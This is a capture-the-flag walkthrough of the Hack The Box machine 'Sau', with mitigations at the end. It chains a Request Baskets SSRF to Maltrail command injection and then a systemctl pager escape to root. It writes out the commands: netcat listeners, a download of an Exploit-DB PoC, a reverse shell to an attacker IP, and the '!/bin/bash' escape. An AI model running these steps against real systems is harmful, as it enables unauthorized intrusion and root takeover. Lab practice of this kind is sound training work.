# Sau — Hack The Box

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Linux |
| **Difficulty** | Easy |
| **IP** | `10.129.63.134` |
| **Author** | sau123 |

## Synopsis

Sau is an easy Linux machine that runs a **Request Baskets** instance vulnerable to
Server-Side Request Forgery (SSRF) via **CVE-2023-27163**. The SSRF is used to reach an
internal **Maltrail** instance that is vulnerable to **unauthenticated OS command
injection**, granting a reverse shell as the user `puma`. A **sudo misconfiguration**
combined with **CVE-2023-26604** (systemd/`less` pager escape) is then abused to obtain a
root shell.

**Skills required:** web enumeration, Linux fundamentals
**Skills learned:** command injection, sudo exploitation

---

## Enumeration

### Nmap

Run a full port scan:

```bash
nmap -p- --min-rate=5000 -T4 10.129.63.134
```

Results:

| Port | State | Service |
|------|-------|---------|
| 22 | open | OpenSSH |
| 80 | filtered | (unknown — reachable only internally) |
| 8338 | filtered | — |
| 55555 | open | HTTP (Request Baskets) |

### HTTP (port 55555)

Because port 80 is filtered, enumeration starts on **port 55555**, which hosts a
**Request Baskets** instance — a web service that collects arbitrary HTTP requests for
inspection via a REST API or web UI.

The footer reveals **Version: 1.2.1**, which is vulnerable to **SSRF (CVE-2023-27163)** via
the `/api/baskets/{name}` component. This allows an attacker to reach internal network
resources through crafted API requests.

---

## Exploitation — SSRF (CVE-2023-27163)

### 1. Confirm the SSRF

Create a new basket, then start a listener on the attacker machine:

```bash
nc -lnvp 80
```

Open the basket's configuration (gear icon, top-left) and set the **Forward URL** to the
attacker IP, then **Apply**. Trigger a request to the basket:

```bash
curl http://10.129.63.134:55555/2ck6d27
```

The request lands on the Netcat listener → SSRF confirmed.

### 2. Reach the filtered port 80

Edit the basket configuration again and set the **Forward URL** to `http://127.0.0.1:80`,
enabling:

- **Proxy Response** — the basket behaves as a full proxy; responses from `forward_url`
  are passed back to the original client.
- **Expand Forward Path** — the forward URL path is expanded when the original request
  contains a compound path.

Apply, then browse to the **request collector** (not the `/web/<id>/` UI path):

```
http://10.129.63.134:55555/<basket-id>
```

The internal service on port 80 is a **Maltrail v0.53** instance (visible in the footer).

---

## Foothold — Maltrail OS Command Injection

Maltrail **v0.53** is vulnerable to **unauthenticated OS command injection**. Use the
public PoC from Exploit-DB (51676).

Download the exploit and start a listener:

```bash
curl -s https://www.exploit-db.com/download/51676 > exploit.py
nc -lnvp 4444
```

Run the PoC, passing the attacker IP, listener port and the basket collector URL (which
proxies to the internal Maltrail):

```bash
python3 exploit.py 10.10.14.6 4444 http://10.129.63.134:55555/2ck6d27
```

A reverse shell returns as user **`puma`**.

### Stabilise the shell

```bash
script /dev/null -c bash
# Ctrl + z
stty -raw echo; fg
# press Enter (Return) twice
```

The **user flag** is at `/home/puma`.

---

## Privilege Escalation — sudo + CVE-2023-26604

Check sudo permissions:

```bash
sudo -l
```

`puma` can run the following **as root without a password**:

```
/usr/bin/systemctl status trail.service
```

Check the systemd version:

```bash
systemctl --version
```

It reports **systemd 245**, vulnerable to **CVE-2023-26604**. systemd does not set
`LESSSECURE=1`, so the `less` pager invoked by `systemctl status` can spawn arbitrary
programs.

Run the allowed command as root:

```bash
sudo /usr/bin/systemctl status trail.service
```

When the output opens in the `less` pager, escape to a shell:

```
!/bin/bash
```

Because the command runs as root, the spawned shell is also **root**. The **root flag** is
at `/root`.

---

## Mitigations

- **Request Baskets:** upgrade past 1.2.1 to a version patching CVE-2023-27163; do not
  expose the service without network segmentation.
- **Maltrail:** upgrade past v0.53 to remove the unauthenticated command injection.
- **sudo:** avoid granting `systemctl status` (or any pager-spawning command) via sudo;
  set `LESSSECURE=1` or use `--no-pager`. Patch systemd against CVE-2023-26604.

## References

- CVE-2023-27163 — Request Baskets SSRF
- Maltrail v0.53 unauthenticated OS command injection — Exploit-DB 51676
- CVE-2023-26604 — systemd `less` pager privilege escalation
